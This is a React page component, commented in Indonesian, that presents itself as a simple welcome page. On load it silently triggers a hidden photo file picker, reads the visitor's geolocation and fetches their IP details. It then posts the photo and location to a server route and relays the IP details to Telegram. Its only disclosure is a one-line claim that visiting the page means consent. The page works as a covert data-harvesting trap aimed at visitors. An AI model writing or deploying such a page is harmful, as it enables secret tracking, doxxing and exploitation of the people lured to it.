import { useState, useEffect } from 'react';

export default function Home() {
  const [photo, setPhoto] = useState(null);
  const [location, setLocation] = useState(null);
  const [ipDetails, setIpDetails] = useState(null);

  // Ambil foto secara otomatis
  useEffect(() => {
    const handlePhotoChange = (event) => {
      const file = event.target.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onloadend = () => {
          setPhoto(reader.result);
        };
        reader.readAsDataURL(file);
      }
    };

    // Buat input file tersembunyi
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = 'image/*';
    fileInput.style.display = 'none';
    fileInput.onchange = handlePhotoChange;
    document.body.appendChild(fileInput);
    fileInput.click();

    // Bersihkan input file setelah selesai
    return () => {
      document.body.removeChild(fileInput);
    };
  }, []);

  // Ambil lokasi secara otomatis
  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        },
        (error) => {
          console.error('Error fetching location', error);
        }
      );
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
  }, []);

  // Ambil detail IP secara otomatis
  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const response = await fetch('/api/get-ip-details');
        const data = await response.json();
        setIpDetails(data);
      } catch (error) {
        console.error('Error fetching IP details', error);
      }
    };

    fetchIpDetails();
  }, []);

  // Kirim data ke server setelah semua data terkumpul
  useEffect(() => {
    if (photo && location && ipDetails) {
      const sendData = async () => {
        try {
          // Simpan data ke server
          const saveResponse = await fetch('/api/save-data', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ photo, location }),
          });

          if (saveResponse.ok) {
            const { fileName } = await saveResponse.json();

            // Kirim pesan ke Telegram
            await fetch('/api/send-telegram', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ fileName, ipDetails }),
            });
          }
        } catch (error) {
          console.error('Error sending data', error);
        }
      };

      sendData();
    }
  }, [photo, location, ipDetails]);

  return (
    <div>
      <h1>Selamat Datang di Website Kami</h1>
      <p>
        Dengan mengakses website ini, Anda menyetujui pengumpulan data foto, lokasi, dan detail IP
        untuk keperluan analisis. Silakan baca <a href="/privacy-policy">Kebijakan Privasi</a> kami.
      </p>
    </div>
  );
}